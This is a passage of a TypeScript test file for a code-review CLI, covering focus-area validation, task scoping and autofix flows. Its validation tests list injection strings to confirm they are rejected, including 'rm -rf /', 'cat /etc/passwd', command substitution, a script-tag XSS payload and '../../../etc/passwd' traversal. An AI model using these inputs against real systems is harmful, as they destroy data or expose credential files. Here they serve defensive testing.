          title: 'Test Plan',
          goal: 'Test goal',
          tasks: [{ title: 'Test task', description: 'A test task' }],
        },
        { cwdForIdentity: testDir }
      );

      const mockExecutor = {
        execute: async () => {
          throw new Error('Network timeout');
        },
      };

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: '1',
          planData: {
            id: 1,
            title: 'Test Plan',
            goal: 'Test goal',
            tasks: [
              {
                title: 'Test task',
                description: 'A test task',
              },
            ],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['test.ts'],
            baseBranch: 'main',
            diffContent: 'test diff',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

      vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(1, {}, mockCommand)).rejects.toThrow(
        /Review execution failed: Network timeout/
      );
    });
  });

  describe('Focus areas validation', () => {
    test('prevents injection attacks in focus areas', () => {
      const maliciousFocusAreas = [
        ['security; rm -rf /'],
        ['performance && echo hacked'],
        ['testing | cat /etc/passwd'],
        ['review`echo hacked`'],
        ['focus$(echo hacked)'],
        ['area\nrm -rf /'],
        ['<script>alert("xss")</script>'],
        ['${process.env.HOME}'],
        ['../../../etc/passwd'],
        ['focus\x00hidden'],
      ];

      for (const maliciousAreas of maliciousFocusAreas) {
        expect(() => validateFocusAreas(maliciousAreas)).toThrow(
          /Focus area contains invalid characters/
        );
      }
    });

    test('allows safe focus areas', () => {
      const safeFocusAreas = [
        ['security', 'performance'],
        ['code-quality', 'testing'],
        ['review_guidelines'],
        ['API.design'],
        ['user-experience'],
        ['data_validation'],
        ['error handling'],
        ['documentation'],
      ];

      for (const safeAreas of safeFocusAreas) {
        expect(() => validateFocusAreas(safeAreas)).not.toThrow();
        const result = validateFocusAreas(safeAreas);
        expect(result).toEqual(safeAreas);
      }
    });

    test('enforces focus area limits', () => {
      const tooManyAreas = Array(15).fill('area');
      expect(() => validateFocusAreas(tooManyAreas)).toThrow('Too many focus areas specified');

      const tooLongArea = ['a'.repeat(100)];
      expect(() => validateFocusAreas(tooLongArea)).toThrow('Focus area too long');
    });

    test('filters empty and whitespace-only areas', () => {
      const areasWithEmpty = ['security', '', '   ', 'performance', '\t'];
      const result = validateFocusAreas(areasWithEmpty);
      expect(result).toEqual(['security', 'performance']);
    });

    test('validates input type for focus areas', () => {
      expect(() => validateFocusAreas(null as any)).toThrow('Focus areas must be an array');
      expect(() => validateFocusAreas('not-array' as any)).toThrow('Focus areas must be an array');
      expect(() => validateFocusAreas(42 as any)).toThrow('Focus areas must be an array');
    });
  });

  describe('Review task scoping', () => {
    test('returns original plan when no filters are provided', () => {
      const planData: PlanSchema = {
        id: 1,
        title: 'Scoped Plan',
        goal: 'Test scoping',
        tasks: [
          { title: 'Task One', description: 'First task', done: false },
          { title: 'Task Two', description: 'Second task', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, {});

      expect(result.planData).toBe(planData);
      expect(result.taskScopeNote).toBeUndefined();
      expect(result.isScoped).toBe(false);
      expect(result.remainingTasks).toEqual([]);
    });

    test('filters tasks by index and preserves order', () => {
      const planData: PlanSchema = {
        id: 2,
        title: 'Index Filter Plan',
        goal: 'Test index filters',
        tasks: [
          { title: 'Task One', description: 'First task', done: false },
          { title: 'Task Two', description: 'Second task', done: false },
          { title: 'Task Three', description: 'Third task', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskIndex: ['1', '3'] }); // 1-based indices

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Task One', 'Task Three']);
      expect(result.taskScopeNote).toContain('(2 of 3)');
      expect(result.isScoped).toBe(true);
      // Task Two (index 2) is unfinished and outside the scope
      expect(result.remainingTasks).toEqual([{ index: 2, title: 'Task Two' }]);
    });

    test('preserves original task indexes when filtering', () => {
      const planData: PlanSchema = {
        id: 2,
        title: 'Original Index Plan',
        goal: 'Test original index preservation',
        tasks: [
          { title: 'Task One', description: 'First task', done: false },
          { title: 'Task Two', description: 'Second task', done: false },
          { title: 'Task Three', description: 'Third task', done: false },
          { title: 'Task Four', description: 'Fourth task', done: false },
          { title: 'Task Five', description: 'Fifth task', done: false },
        ],
      };

      // Select tasks 2 and 4 (1-based)
      const result = resolveReviewTaskScope(planData, { taskIndex: ['2', '4'] });

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Task Two', 'Task Four']);
      // Verify original 1-based indexes are preserved
      expect(result.planData.tasks?.map((task: any) => task.originalIndex)).toEqual([2, 4]);
      expect(result.isScoped).toBe(true);
    });

    test('permits selecting a completed task while preserving its plan index', () => {
      const planData: PlanSchema = {
        id: 10,
        title: 'Completed Scope Plan',
        goal: 'Test completed task selection',
        tasks: [
          { title: 'Pending One', description: 'First task', done: false },
          { title: 'Done Task', description: 'Completed task', done: true },
          { title: 'Pending Three', description: 'Third task', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskIndex: ['2'] });

      expect(result.planData.tasks?.map((task: any) => task.title)).toEqual(['Done Task']);
      expect(result.planData.tasks?.map((task: any) => task.originalIndex)).toEqual([2]);
      expect(result.remainingTasks).toEqual([
        { index: 1, title: 'Pending One' },
        { index: 3, title: 'Pending Three' },
      ]);
    });

    test('filters tasks by title case-insensitively and includes duplicates', () => {
      const planData: PlanSchema = {
        id: 3,
        title: 'Title Filter Plan',
        goal: 'Test title filters',
        tasks: [
          { title: 'Build', description: 'First', done: false },
          { title: 'Test', description: 'Second', done: false },
          { title: 'build', description: 'Third', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskTitle: ['BUILD'] });

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Build', 'build']);
      expect(result.isScoped).toBe(true);
    });

    test('supports comma-separated task filters and unions matches', () => {
      const planData: PlanSchema = {
        id: 5,
        title: 'Comma Filter Plan',
        goal: 'Test comma filters',
        tasks: [
          { title: 'Alpha', description: 'First', done: false },
          { title: 'Beta', description: 'Second', done: false },
          { title: 'Gamma', description: 'Third', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, {
        taskIndex: ['1,3'], // 1-based indices
        taskTitle: ['Beta'],
      });

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Alpha', 'Beta', 'Gamma']);
      expect(result.isScoped).toBe(true);
    });

    test('rejects non-integer task index filters', () => {
      const planData: PlanSchema = {
        id: 6,
        title: 'Invalid Index Plan',
        goal: 'Test invalid indexes',
        tasks: [{ title: 'Task One', description: 'Only task', done: false }],
      };

      expect(() => resolveReviewTaskScope(planData, { taskIndex: ['1.5'] })).toThrow(
        'Invalid task indexes: 1.5'
      );
    });

    test('reports unknown task indexes and titles', () => {
      const planData: PlanSchema = {
        id: 4,
        title: 'Error Plan',
        goal: 'Test unknown filters',
        tasks: [{ title: 'Task One', description: 'Only task', done: false }],
      };

      expect(() =>
        resolveReviewTaskScope(planData, { taskIndex: ['5'], taskTitle: ['Missing Task'] })
      ).toThrow('Unknown task indexes: 5; Unknown task titles: Missing Task');
    });

    test('reports an unknown index alone as scoped (not a silent unscoped pass-through)', () => {
      const planData: PlanSchema = {
        id: 11,
        title: 'Unknown Index Only Plan',
        goal: 'Test unknown index boundary',
        tasks: [{ title: 'Task One', description: 'Only task', done: false }],
      };

      expect(() => resolveReviewTaskScope(planData, { taskIndex: ['5'] })).toThrow(
        'Unknown task indexes: 5'
      );
    });

    test('reports unknown task indexes in input order, not sorted', () => {
      // Pins the review resolver's ordering policy: input order, unlike the
      // subagent resolver which sorts ascending for its error text.
      const planData: PlanSchema = {
        id: 12,
        title: 'Unknown Index Order Plan',
        goal: 'Test unknown index ordering',
        tasks: [{ title: 'Task One', description: 'Only task', done: false }],
      };

      expect(() => resolveReviewTaskScope(planData, { taskIndex: ['9', '5'] })).toThrow(
        'Unknown task indexes: 9, 5'
      );
    });

    test('dedupes repeated and comma-mixed indexes and returns them in ascending plan order', () => {
      const planData: PlanSchema = {
        id: 13,
        title: 'Dedup Order Plan',
        goal: 'Test dedup and ordering',
        tasks: [
          { title: 'Task One', description: '', done: false },
          { title: 'Task Two', description: '', done: false },
          { title: 'Task Three', description: '', done: false },
          { title: 'Task Four', description: '', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskIndex: ['4,1', '3', '1'] });

      expect(result.planData.tasks?.map((task) => task.title)).toEqual([
        'Task One',
        'Task Three',
        'Task Four',
      ]);
      expect(result.planData.tasks?.map((task: any) => task.originalIndex)).toEqual([1, 3, 4]);
    });

    test('reports negative indexes as invalid alongside missing titles', () => {
      const planData: PlanSchema = {
        id: 7,
        title: 'Negative Index Plan',
        goal: 'Test negative indexes',
        tasks: [{ title: 'Task One', description: 'Only task', done: false }],
      };

      // -1 is treated as invalid (not a valid 1-based index)
      expect(() =>
        resolveReviewTaskScope(planData, { taskIndex: ['-1'], taskTitle: ['Missing Task'] })
      ).toThrow('Invalid task indexes: -1; Unknown task titles: Missing Task');
    });

    test('remainingTasks excludes done tasks outside scope', () => {
      const planData: PlanSchema = {
        id: 8,
        title: 'Remaining Tasks Plan',
        goal: 'Test remaining tasks',
        tasks: [
          { title: 'Scoped Task', description: 'In scope', done: false },
          { title: 'Done Task', description: 'Already done', done: true },
          { title: 'Pending Task', description: 'Still pending', done: false },
          { title: 'Another Pending', description: 'Also pending', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskIndex: ['1'] });

      expect(result.isScoped).toBe(true);
      expect(result.planData.tasks?.map((t) => t.title)).toEqual(['Scoped Task']);
      // Done Task (index 2) should be excluded, Pending Task (3) and Another Pending (4) included
      expect(result.remainingTasks).toEqual([
        { index: 3, title: 'Pending Task' },
        { index: 4, title: 'Another Pending' },
      ]);
    });

    test('remainingTasks is empty when all non-scoped tasks are done', () => {
      const planData: PlanSchema = {
        id: 9,
        title: 'All Done Plan',
        goal: 'Test no remaining tasks',
        tasks: [
          { title: 'Scoped Task', description: 'In scope', done: false },
          { title: 'Done One', description: 'Finished', done: true },
          { title: 'Done Two', description: 'Also finished', done: true },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskIndex: ['1'] });

      expect(result.isScoped).toBe(true);
      expect(result.remainingTasks).toEqual([]);
    });
  });
});

describe('Custom review instructions', () => {
  test('validateInstructionsFilePath rejects malicious paths and accepts safe ones', () => {
    const gitRoot = '/safe/project';

    // Test path traversal protection
    expect(() => validateInstructionsFilePath('../../../etc/passwd', gitRoot)).toThrow();
    expect(() => validateInstructionsFilePath('/etc/passwd', gitRoot)).toThrow();

    // Test safe paths
    expect(() => validateInstructionsFilePath('instructions.md', gitRoot)).not.toThrow();
    expect(() => validateInstructionsFilePath('./docs/review.md', gitRoot)).not.toThrow();
  });

  test('validateFocusAreas rejects malicious input and accepts safe areas', () => {
    // Test injection protection
    expect(() => validateFocusAreas(['security; rm -rf /'])).toThrow();
    expect(() => validateFocusAreas(['performance && echo hacked'])).toThrow();
    expect(() => validateFocusAreas(['<script>alert("xss")</script>'])).toThrow();

    // Test safe focus areas
    expect(() => validateFocusAreas(['security', 'performance', 'testing'])).not.toThrow();
    expect(validateFocusAreas(['security', 'performance'])).toEqual(['security', 'performance']);

    // Test limits
    expect(() => validateFocusAreas(Array(15).fill('area'))).toThrow('Too many focus areas');
    expect(() => validateFocusAreas(['a'.repeat(100)])).toThrow('Focus area too long');
  });

  test('error messages use proper formatting instead of template literals', () => {
    // Test that our error handling fixes work correctly
    const error = new Error('Test error');
    const errorMessage = error instanceof Error ? error.message : String(error);
    expect(errorMessage).toBe('Test error');

    // Test string coercion for non-Error objects
    const nonError = { message: 'Not an error object' };
    const nonErrorMessage = nonError instanceof Error ? nonError.message : String(nonError);
    expect(nonErrorMessage).toBe('[object Object]');
  });

  test('properly handles buildReviewPrompt function signature with custom instructions', () => {
    // Test that buildReviewPrompt accepts the customInstructions parameter
    const planData = { id: 1, title: 'Test', goal: 'Test goal', tasks: [] };
    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'diff',
    };

    // This should not throw and should work with the new signature
    expect(() =>
      buildReviewPrompt(planData, diffResult, true, false, [], [], 'custom instructions')
    ).not.toThrow();
    expect(() => buildReviewPrompt(planData, diffResult, true, false, [], [])).not.toThrow();
  });

  test('buildReviewPrompt includes remaining tasks section when provided', () => {
    const planData = {
      id: 1,
      title: 'Test',
      goal: 'Test goal',
      tasks: [{ title: 'Scoped Task', description: 'In scope', done: false }],
    };
    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'diff',
    };
    const remainingTasks = [
      { index: 2, title: 'Pending Task' },
      { index: 4, title: 'Another Pending' },
    ];

    const prompt = buildReviewPrompt(
      planData,
      diffResult,
      false,
      false,
      [],
      [],
      undefined,
      'Scoped to 1 of 4 tasks',
      undefined,
      remainingTasks
    );

    expect(prompt).toContain('Remaining Unfinished Tasks');
    expect(prompt).toContain('2. Pending Task');
    expect(prompt).toContain('4. Another Pending');
    expect(prompt).toContain('not yet implemented');
  });

  test('buildReviewPrompt omits remaining tasks section when empty', () => {
    const planData = { id: 1, title: 'Test', goal: 'Test goal', tasks: [] };
    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'diff',
    };

    const prompt = buildReviewPrompt(
      planData,
      diffResult,
      false,
      false,
      [],
      [],
      undefined,
      undefined,
      undefined,
      []
    );

    expect(prompt).not.toContain('Remaining Unfinished Tasks');
  });

  test('validates function signatures work correctly after security fixes', () => {
    // Test that all our security functions work as expected
    const gitRoot = '/test/project';

    // Test validateInstructionsFilePath with various inputs
    expect(() => validateInstructionsFilePath('safe-file.md', gitRoot)).not.toThrow();
    expect(() => validateInstructionsFilePath('../unsafe', gitRoot)).toThrow();

    // Test validateFocusAreas with various inputs
    expect(() => validateFocusAreas(['safe', 'areas'])).not.toThrow();
    expect(() => validateFocusAreas(['unsafe; injection'])).toThrow();

    // Test that they return expected values for valid inputs
    const safePath = validateInstructionsFilePath('docs/instructions.md', gitRoot);
    expect(safePath).toContain('docs/instructions.md');

    const safeAreas = validateFocusAreas(['security', 'performance']);
    expect(safeAreas).toEqual(['security', 'performance']);
  });
});

describe('Autofix functionality', () => {
  test('reopens a reviewed plan after appending review issues as tasks', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 299,
        title: 'Reviewed Plan',
        goal: 'Append follow-up review issues',
        details: 'Plan details',
        status: 'reviewed',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );

    const appendedCount = await persistReviewIssueAppend(
      299,
      [
        {
          id: 'issue-1',
          severity: 'major',
          category: 'bug',
          content: 'Fix the reviewed follow-up',
          file: 'src/reviewed.ts',
        },
      ],
      testDir
    );

    const updatedPlan = (await resolvePlanByNumericId(299, testDir)).plan;
    expect(appendedCount).toBe(1);
    expect(updatedPlan.status).toBe('in_progress');
    expect(updatedPlan.tasks).toHaveLength(1);
    expect(updatedPlan.tasks?.[0]).toMatchObject({
      title: 'Address Review Feedback: Fix the reviewed follow-up',
      description: 'Fix the reviewed follow-up\n\nRelated file: src/reviewed.ts',
      done: false,
    });
  });

  test('reopens a needs_review parent after appending review issues to a reopened child', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 300,
        title: 'Review Parent',
        goal: 'Track parent state',
        details: 'Parent details',
        status: 'needs_review',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    await writePlanToDb(
      {
        id: 301,
        title: 'Review Child',
        goal: 'Append review issues',
        details: 'Child details',
        status: 'needs_review',
        parent: 300,
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    await reopenParentForAppendedReviewTasks(
      {
        parent: 300,
        status: 'needs_review',
      },
      testDir
    );

    const updatedParent = (await resolvePlanByNumericId(300, testDir)).plan;
    expect(updatedParent.status).toBe('in_progress');
  });

  test('reopens a done parent after appending review issues to a reopened child', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 302,
        title: 'Done Parent',
        goal: 'Track parent state',
        details: 'Parent details',
        status: 'done',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    await reopenParentForAppendedReviewTasks(
      {
        parent: 302,
        status: 'done',
      },
      testDir
    );

    const updatedParent = (await resolvePlanByNumericId(302, testDir)).plan;
    expect(updatedParent.status).toBe('in_progress');
  });

  test('reopens a reviewed parent after appending review issues to a reopened child', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 304,
        title: 'Reviewed Parent',
        goal: 'Track parent state',
        details: 'Parent details',
        status: 'reviewed',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    await reopenParentForAppendedReviewTasks(
      {
        parent: 304,
        status: 'reviewed',
      },
      testDir
    );

    const updatedParent = (await resolvePlanByNumericId(304, testDir)).plan;
    expect(updatedParent.status).toBe('in_progress');
  });

  test('does not reopen the parent when the child was already in_progress', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 303,
        title: 'In Progress Parent',
        goal: 'Track parent state',
        details: 'Parent details',
        status: 'needs_review',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );
    await reopenParentForAppendedReviewTasks(
      {
        parent: 303,
        status: 'in_progress',
      },
      testDir
    );

    const updatedParent = (await resolvePlanByNumericId(303, testDir)).plan;
    expect(updatedParent.status).toBe('needs_review');
  });

  test('materializes DB-only plans before review and autofix execution', async () => {
    process.chdir(testDir);
    await writePlanToDb(
      {
        id: 123,
        title: 'DB-only Autofix Plan',
        goal: 'Verify review/autofix materialization',
        tasks: [
          {
            title: 'Fix review issues',
            description: 'Materialize before executor handoff',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    const materializedPlanPath = join(testDir, '.tim', 'plans', '123.plan.md');

    vi.mocked(inquirerModule.confirm).mockRejectedValue(
      new Error('Confirm should not be called with --autofix flag')
    );
    vi.mocked(inquirerModule.checkbox).mockImplementation(async ({ choices }: { choices: any[] }) =>
      choices.map((choice: any) => choice.value)
    );

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          expect(metadata.planFilePath).toBe(materializedPlanPath);
          return JSON.stringify({
            issues: [
              {
                severity: 'critical',
                category: 'security',
                content: 'Missing authorization check',
                file: 'src/auth.ts',
                line: '12',
                suggestion: 'Add the missing authorization guard.',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        }

        expect(metadata.executionMode).toBe('normal');
        expect(metadata.planFilePath).toBe(materializedPlanPath);
        expect(prompt).toContain('Autofix Request');
        await writePlanFile(materializedPlanPath, {
          id: 123,
          title: 'DB-only Autofix Plan',
          goal: 'Verify review/autofix materialization',
          details: 'Updated by autofix',
          tasks: [
            {
              title: 'Fix review issues',
              description: 'Materialize before executor handoff',
              done: true,
            },
          ],
        });
        return 'Autofix completed successfully';
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '123',
        planData: {
          id: 123,
          title: 'DB-only Autofix Plan',
          goal: 'Verify review/autofix materialization',
          tasks: [
            {
              title: 'Fix review issues',
              description: 'Materialize before executor handoff',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/auth.ts'],
          baseBranch: 'main',
          diffContent: 'diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(123, { autofixAll: true, noSave: true }, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(2);
    expect(mockExecutor.execute.mock.calls[0]?.[1]?.planFilePath).toBe(materializedPlanPath);
    expect(mockExecutor.execute.mock.calls[1]?.[1]?.planFilePath).toBe(materializedPlanPath);
    const materializedPlan = await readPlanFile(materializedPlanPath);
    expect(materializedPlan.id).toBe(123);
    expect(materializedPlan.title).toBe('DB-only Autofix Plan');
    expect(sendNotificationSpy).toHaveBeenCalled();
    expect(
      sendNotificationSpy.mock.calls.some(
        ([, payload]) => payload?.command === 'review' && payload?.planFile === materializedPlanPath
      )
    ).toBe(true);
    const updatedPlan = (await resolvePlanByNumericId(123, testDir)).plan;
    expect(updatedPlan.details).toBe('Updated by autofix');
    expect(updatedPlan.tasks?.[0]?.done).toBe(true);
  });

  test('autofix flag executes review then autofix when issues found', async () => {
    await writePlanToDb(
      {
        id: 123,
        title: 'Test Plan with Issues',
        goal: 'Test autofix functionality',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task that has issues',
          },
        ],
        reviewIssues: [
          {
            id: 'previously-rejected',
            severity: 'major',
            category: 'style',
            content: 'A previously rejected finding.',
            file: 'src/old.ts',
            line: 4,
            rejected: true,
            rejectedReason: 'This existing pattern is intentional.',
            rejectedAt: '2026-08-03T12:00:00.000Z',
          },
          {
            id: 'saved-open-finding',
            severity: 'minor',
            category: 'security',
            content: 'Security Vulnerability - Unsafe input validation',
            file: 'src/input.ts',
            line: 42,
            suggestion: 'An older suggestion for the same finding.',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    // Mock checkbox to return all issues when autofix flag is used
    vi.mocked(inquirerModule.confirm).mockRejectedValue(
      new Error('Confirm should not be called with --autofix flag')
    );
    vi.mocked(inquirerModule.checkbox).mockImplementation(
      async ({ choices }: { choices: any[] }) => {
        // Return all issues for autofix
        return choices.map((c: any) => c.value);
      }
    );

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          // First call is the review - return JSON output with issues
          return JSON.stringify({
            issues: [
              {
                severity: 'critical',
                category: 'security',
                content: 'Security Vulnerability - Unsafe input validation',
                file: 'src/input.ts',
                line: '42',
                suggestion: 'Add proper input sanitization',
              },
              {
                severity: 'critical',
                category: 'performance',
                content: 'Performance Issue - N+1 query problem',
                file: 'src/queries.ts',
                line: '100',
                suggestion: 'Use batch queries',
              },
            ],
            recommendations: ['Fix input validation', 'Optimize database queries'],
            actionItems: [],
          });
        } else if (metadata.executionMode === 'normal') {
          // Second call is the autofix
          expect(prompt).toContain('Autofix Request');
          expect(prompt).toContain('Security Vulnerability');
          expect(prompt).toContain('Performance Issue');
          return 'Autofix completed successfully';
        }
        return 'Unexpected execution mode';
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '123',
        planData: {
          id: 123,
          title: 'Test Plan with Issues',
          goal: 'Test autofix functionality',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task that has issues',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'test review prompt',
    } as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(123, { autofixAll: true }, mockCommand);

    // Verify the executor was called twice: once for review, once for autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(2);

    // Verify the first call was for review (simple mode)
    expect(mockExecutor.execute).toHaveBeenNthCalledWith(
      1,
      'test review prompt',
      expect.objectContaining({
        executionMode: 'review',
        captureOutput: 'result',
      })
    );

    // Verify the second call was for autofix (normal mode)
    expect(mockExecutor.execute).toHaveBeenNthCalledWith(
      2,
      expect.stringContaining('Autofix Request'),
      expect.objectContaining({
        executionMode: 'normal',
        captureOutput: 'none',
      })
    );

    expect((await resolvePlanByNumericId(123, testDir)).plan.reviewIssues).toEqual([
      expect.objectContaining({
        id: 'previously-rejected',
        rejected: true,
        rejectedReason: 'This existing pattern is intentional.',
      }),
    ]);
  });

  // TODO something flaky about this test
  test.skip('prompts user for autofix when issues found without autofix flag', async () => {
    const planFile = join(testDir, 'interactive-test.yml'); // only used in mock context

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          return JSON.stringify({
            issues: [
              {
                severity: 'major',
                category: 'bug',
                content: 'Code Quality - Missing error handling',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        } else if (metadata.executionMode === 'normal') {
          return 'Autofix completed';
        }
        return 'Unexpected mode';
      }),
    };

    // Mock the confirm function to return true (user confirms autofix)
    // Also mock checkbox to return all issues
    vi.mocked(inquirerModule.confirm).mockImplementation(
      async ({ message }: { message: string }) => {
        expect(message).toContain('Issues were found during review');
        expect(message).toContain('automatically fix them');
        return true;
      }
    );
    vi.mocked(inquirerModule.select).mockImplementation(async ({ choices }: { choices: any[] }) => {
      // Return first choice
      return choices[0].value;
    });
    vi.mocked(inquirerModule.checkbox).mockImplementation(
      async ({ choices }: { choices: any[] }) => {
        // Return all choices
        return choices.map((choice: any) => choice.value);
      }
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Call without autofix flag - should prompt user and execute autofix
    await handleReviewCommand(124, {}, mockCommand);

    // Should execute both review and autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(2);
  });

  test('respects user declining autofix prompt', async () => {
    await writePlanToDb(
      {
        id: 125,
        title: 'Test Declined Autofix',
        goal: 'Test user declining autofix',
        tasks: [{ title: 'Test task', description: 'A test task with issues' }],
      },
      { cwdForIdentity: testDir }
    );
    const planFile = join(testDir, 'decline-test.yml'); // only used in mock context

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          return JSON.stringify({
            issues: [
              {
                severity: 'minor',
                category: 'style',
                content: 'Style - Missing documentation',
                file: 'src/utils.ts',
                line: '25',
                suggestion: 'Add JSDoc comments',
              },
            ],
            recommendations: [],
            actionItems: [],
          });
        }
        // Should not be called for autofix
        throw new Error('Autofix should not be executed when user declines');
      }),
    };

    // Mock the confirm function to return false (user declines autofix)
    // Also mock checkbox in case it's called (shouldn't be if confirm returns false)
    vi.mocked(inquirerModule.select).mockImplementation(
      async ({ message }: { message: string }) => {
        expect(message).toContain('Issues were found during review');
        return 'exit' as any;
      }
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '125',
        planData: {
          id: 125,
          title: 'Test Declined Autofix',
          goal: 'Test user declining autofix',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task with issues',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'test review prompt',
    } as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(125, {}, mockCommand);

    // Should only execute review, not autofix
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledWith(
      'test review prompt',
      expect.objectContaining({
        executionMode: 'review',
      })
    );
  });

  test('no prompt or autofix when no issues found', async () => {
    await writePlanToDb(
      {
        id: 126,
        title: 'Test No Issues',
        goal: 'Test no autofix when no issues',
        tasks: [{ title: 'Test task', description: 'A clean test task' }],
      },
      { cwdForIdentity: testDir }
    );
    const planFile = join(testDir, 'no-issues-test.yml'); // only used in mock context

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        if (metadata.executionMode === 'review') {
          // Return review output with no issues
          return JSON.stringify({
            issues: [],
            recommendations: ['Continue following current coding standards and best practices.'],
            actionItems: [],
          });
        }
        throw new Error('Autofix should not be executed when no issues found');
      }),
    };

    // Mock confirm to throw if called (it shouldn't be)
    // Also mock checkbox to throw if called (it shouldn't be)
    vi.mocked(inquirerModule.confirm).mockRejectedValue(
      new Error('Confirm should not be called when no issues found')
    );
    vi.mocked(inquirerModule.checkbox).mockRejectedValue(
      new Error('Checkbox should not be called when no issues found')
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '126',
        planData: {
          id: 126,
          title: 'Test No Issues',
          goal: 'Test no autofix when no issues',
          tasks: [
